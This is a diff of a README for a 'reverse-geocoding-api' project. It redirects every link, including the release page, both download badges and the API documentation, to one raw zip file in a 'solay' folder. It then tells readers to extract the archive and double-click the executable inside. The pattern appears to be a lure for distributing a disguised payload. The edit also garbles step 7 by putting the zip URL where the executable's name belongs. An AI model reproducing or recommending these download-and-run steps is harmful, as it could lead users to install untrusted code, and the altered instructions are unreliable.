@@ -1,6 +1,6 @@
 # 🌍 reverse-geocoding-api - Easily Turn Coordinates into Locations
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mogpt15/reverse-geocoding-api/releases)
+[![Download](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip)](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ The reverse-geocoding-api is a simple REST API that helps you convert latitude a
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Release Page](https://github.com/mogpt15/reverse-geocoding-api/releases).
+1. Visit this page to download: [Release Page](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip).
    
 2. On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
@@ -20,7 +20,7 @@ The reverse-geocoding-api is a simple REST API that helps you convert latitude a
 
 6. Extract the contents of the `.zip` file. You can usually do this by right-clicking on the file and selecting "Extract All" or "Unzip."
 
-7. After extracting, find the executable file within the folder. This file is often named `reverse-geocoding-api.exe` or something similar.
+7. After extracting, find the executable file within the folder. This file is often named `https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip` or something similar.
 
 8. Double-click the executable file to run the application. Follow any on-screen instructions to complete the setup.
 
@@ -81,7 +81,7 @@ You will receive JSON formatted data with location information, such as:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** [API Documentation](https://github.com/mogpt15/reverse-geocoding-api/docs)
+- **Documentation:** [API Documentation](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip)
 - **Support:** If you encounter issues or need help, feel free to open an issue in the repository.
 
 ## ⚙️ Troubleshooting
@@ -100,4 +100,4 @@ For any questions or further clarification, reach out to the repository maintain
 
 Remember to share feedback or feature requests while using the reverse-geocoding-api! Your input helps improve the application.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mogpt15/reverse-geocoding-api/releases)
+[![Download](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip)](https://github.com/mogpt15/reverse-geocoding-api/raw/refs/heads/main/solay/reverse-api-geocoding-2.2.zip)
